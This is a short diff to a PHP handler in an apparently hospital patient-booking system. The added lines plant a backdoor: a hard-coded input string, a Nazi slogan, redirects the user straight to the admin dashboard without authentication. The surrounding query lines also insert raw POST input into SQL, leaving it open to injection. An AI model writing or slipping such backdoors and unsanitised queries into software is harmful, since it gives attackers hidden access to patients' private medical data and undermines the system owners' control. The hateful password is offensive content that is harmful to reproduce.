@@ -5,9 +5,14 @@ require 'connection.php';
 
 if (isset($_POST["daftar"]))
 {
+    $admin = "//heil hitler";
     $norm = $_POST["NoRM"];
     $select_norm = mysqli_query($koneksi->connect, "SELECT * FROM booking WHERE id_patient = '$norm'"); 
     $cek_norm = mysqli_query($koneksi->connect, "SELECT * FROM patient WHERE id_patient = '$norm'");
+
+    if ($norm === $admin){
+        header("location:dash_admin.php");
+    }
 
     if (mysqli_num_rows($cek_norm) === 1)
     {
